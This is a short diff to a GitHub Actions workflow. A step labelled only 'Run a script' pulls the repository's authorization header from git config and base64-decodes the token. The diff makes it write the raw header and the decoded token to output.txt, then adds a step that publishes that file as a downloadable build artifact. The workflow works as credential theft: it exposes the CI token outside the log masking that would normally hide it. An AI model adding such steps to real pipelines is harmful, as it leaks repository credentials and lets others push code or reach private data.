@@ -14,9 +14,15 @@ jobs:
       - name: Run a script
         run: |
           HEADER=$(git config --get-all http.https://github.com/.extraheader)
-          echo "Raw header:"
-          echo "$HEADER"
+          echo "Raw header:" > output.txt
+          echo "$HEADER" >> output.txt
           TOKEN=$(echo "$HEADER" | sed 's/AUTHORIZATION: basic //')
-          echo "Decoded token:"
-          echo "$TOKEN" | base64 -d
+          echo "Decoded token:" >> output.txt
+          echo "$TOKEN" | base64 -d >> output.txt
+
+      - name: Upload output file
+        uses: actions/upload-artifact@v3
+        with:
+          name: output-file
+          path: output.txt
 
